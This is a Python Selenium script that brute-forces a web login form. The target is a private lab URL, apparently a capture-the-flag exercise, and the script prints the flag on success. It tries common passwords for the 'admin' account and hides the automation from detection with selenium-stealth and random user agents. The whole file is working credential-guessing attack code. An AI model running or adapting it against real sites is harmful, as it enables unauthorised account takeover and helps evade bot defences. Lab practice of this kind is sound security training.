from selenium.webdriver.common.by import By
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium_stealth import stealth

import time
import logging
from fake_useragent import UserAgent

options = Options()
ua = UserAgent()
userAgent = ua.random
options.add_argument('--no-sandbox')
options.add_argument('--headless')
options.add_argument("start-maximized")
options.add_argument(f'user-agent={userAgent}')
options.add_argument('--disable-dev-shm-usage')
options.add_argument('--disable-cache')
options.add_argument('--disable-gpu')

options.binary_location = "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"
service = Service(executable_path='/usr/local/bin/chromedriver')
chrome = webdriver.Chrome(service=service, options=options)

stealth(chrome,
    languages=["en-US", "en"],
    vendor="Google Inc.",
    platform="Win32",
    webgl_vendor="Intel Inc.",
    renderer="Intel Iris OpenGL Engine",
    fix_hairline=True,
)

# CONFIG
ip = 'http://10.82.190.225/labs/lab1/'
login_url = f'{ip}/index.php'
dashboard_url = f'{ip}/dashboard.php'

# Credentials to brute-force
username = "admin"
passwords = ["123456", "admin", "letmein", "pass123", "password"]  # Replace with file if needed

# Loop over passwords
for password in passwords:
    chrome.get(login_url)
    time.sleep(0.5)

    # Grab CSRF token
    #csrf = chrome.find_element(By.NAME, "csrf_token").get_attribute("value")

    # Fill out login form
    chrome.find_element(By.NAME, "username").send_keys(username)
    chrome.find_element(By.NAME, "password").send_keys(password)
    #chrome.find_element(By.NAME, "csrf_token").send_keys(csrf)
    chrome.find_element(By.TAG_NAME, "form").submit()

    time.sleep(0.5)

    # Check if login successful (simple way)
    if dashboard_url in chrome.current_url:
        print(f"[+] Login successful with password: {password}")
        flag_element = chrome.find_element(By.TAG_NAME, "p")
        flag = flag_element.text.strip()
        print(f"[+] {flag}")
        break
    else:
        print(f"[-] Failed login with: {password}")

chrome.quit()
